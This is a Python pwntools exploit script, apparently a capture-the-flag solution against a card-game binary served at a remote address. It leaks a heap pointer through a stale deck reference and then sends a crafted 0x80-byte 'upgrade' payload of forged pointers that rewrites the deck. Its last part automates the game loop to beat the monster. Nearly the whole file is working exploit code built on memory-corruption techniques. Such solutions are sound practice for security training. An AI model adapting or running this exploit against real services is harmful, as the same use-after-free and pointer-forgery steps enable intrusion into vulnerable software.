
from typing import Union
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = ('debug', 'error')[1]

elf_ = ELF('solved-db/game')
# sh: process = elf_.process()
sh = remote('111.186.57.85',40304)

# sh:process = gdb.debug('solved-db/game', gdbscript='''
#            directory ./solved-db/game.cpp
#             c
        #    ''')
[MENU_BUY, MENU_UPGRADE, MENU_DISPLAY, MENU_DELETE, MENU_VIEWDECK, MENU_START] = range(1,7)
def menu_reader(choice: int):
    sh.recvuntil("Start game")
    sh.recvuntil("Your choice: ")
    sh.sendline(str(choice).encode())

[BUY_STRIKE, BUY_DEFEND, BUY_ERUPTION, BUY_VIGILANCE, BUY_RUSHDOWN] = range(1,6)
def buy_card(choice: int):
    menu_reader(MENU_BUY)
    sh.recvuntil("want to buy?\n")
    sh.sendline(str(choice).encode())

def display_card(index: int, get_address = False) -> Union[None, int]:
    menu_reader(MENU_DISPLAY)
    sh.recvuntil("Input card index:\n")
    sh.sendline(str(index).encode())

    _ = sh.recvline()
    card_name = sh.recvline()
    card_description = sh.recvuntil("Energy cost: 1\n", drop= True)[:-1]
    card_cost = 1
    _ = sh.recvline()

    if get_address:
        description_data = card_description.removeprefix(b"Card description: ")
        print(card_name)
        print("addr data:", description_data)
        return u64(description_data.ljust(8, b'\x00'))

def upgrade_card(index: int, name:str, payload: bytes):
    menu_reader(MENU_UPGRADE)
    sh.recvuntil("Input card index:\n")
    sh.sendline(str(index).encode())
    
    sh.recvuntil("Your new card name:\n")
    assert (len(name) <= 0x10)
    sh.send(name.encode()) # 0x10

    sh.recvuntil("Your new card description for ")
    sh.recvline()
    assert len(payload) == 0x80, len(payload)
    sh.send(payload) #0x80

    sh.recvuntil("upgraded\n")

def show_deck():
    menu_reader(MENU_VIEWDECK)
    sh.recvuntil("--------------\n")
    ret = sh.recvuntil("--------------\n", drop=True)
    print(ret.decode())
    


buy_card(BUY_STRIKE)
buy_card(BUY_STRIKE)
buy_card(BUY_ERUPTION)
buy_card(BUY_VIGILANCE)
# deck: strike, strike, defend, defend, strike, strike, eruption, vigilance

deck_card = 1
display_card(deck_card) # will be used as deck
display_card(2) # will be used as description for rushdown

buy_card(BUY_RUSHDOWN) # deck.data -> 16

# 100 gold left

leak_addr = display_card(deck_card, True) # leak dead, with deck dead
print(hex(leak_addr))

buy_card(BUY_STRIKE) # revive deck but overwrite frontmost 15 bytes


strike_addr = leak_addr

OFFSET_ERUPTION7 =0xf3c0 - 0xeeb0 # 7 - 1 = 6
OFFSET_VIGILANCE8 = 0xf480 - 0xeeb0
OFFSET_RUNSHDOWN9 = 0xf540 - 0xeeb0
OFFSET_LATER = 0xc0

payload = p64(strike_addr + OFFSET_RUNSHDOWN9)* 8 + p64(strike_addr + OFFSET_ERUPTION7) + p64(strike_addr + OFFSET_VIGILANCE8) 
payload = payload.ljust(0x80, b'\x00')
upgrade_card(10, "modified", payload) # upgrade rushdown(10 th card, index 9)

show_deck()

def play():
    RUSHDOWN, ERUPTION, VIGILANCE = b'Rushdown', b'Eruption', b'Vigilance'
    menu_reader(MENU_START)
    def _parseUI():
        # turn = sh.recvline(keepends=False)
        # assert b'Turn' in turn
        # turn = int(turn.split()[1])
        try:
            assert sh.recvuntil(b"-----", timeout= 0.5)
        except:
            # Only should enter here when game is won
            print(sh.recvall(timeout=0.1).decode())
            sh.interactive()
            exit()
                    
        sh.recvlines(2)
        handcards = sh.recvuntil(b"-----", drop=True)
        hand_cards = handcards.split(b'\n')[:-1]
        assert all(line[0] in b'123' for line in hand_cards), "Invalid hand cards format" + str(hand_cards)
        hand_cards = [hand_card.split()[1] for hand_card in hand_cards]

        sh.recvlines(1)
        hp,  block, energy = map(lambda line: int(line.split(b':')[1].strip()), 
                                 sh.recvlines(3, keepends= False))
        
        sh.recvlines(1)
        monster_hp, monster_block = sh.recvlines(2, keepends=False)
        monster_hp = int(monster_hp.split(b':')[1].strip())
        monster_block = int(monster_block.split()[3])

        sh.recvlines(2)
        # to enter card sequence number to play
        return hand_cards, hp, block, energy, monster_hp, monster_block
    # def _parse_intermediate_ui():
    #     sh.recviuntil("Your choice: ")
    def _play_card(card_index: int):
        # assert card_index > 0
        sh.sendline(str(card_index).encode())
    '''
    Enter menu with 8 Rushdown and 1 Eruption 1 Vigilance
    '''
    rushdowns = 8

    print("Using out Rushdown")
    while rushdowns :
        hand_cards, hp, block, energy, monster_hp, monster_block = _parseUI()
        if energy and RUSHDOWN in hand_cards:
            _play_card(hand_cards.index(RUSHDOWN) + 1)
            rushdowns -= 1
        else:
            _play_card(0)

    # skip to ensure energy = 3
    _parseUI()
    _play_card(0)
    
    print("Looping Eruption and Vigilance")
    while True:
        hand_cards, hp, block, energy, monster_hp, monster_block = _parseUI()
        _play_card(hand_cards.index(VIGILANCE) + 1)
        hand_cards, hp, block, energy, monster_hp, monster_block = _parseUI()
        _play_card(hand_cards.index(ERUPTION) + 1)
        print(monster_hp)




    



play()

raise Exception("Should not reach here")
sh.interactive()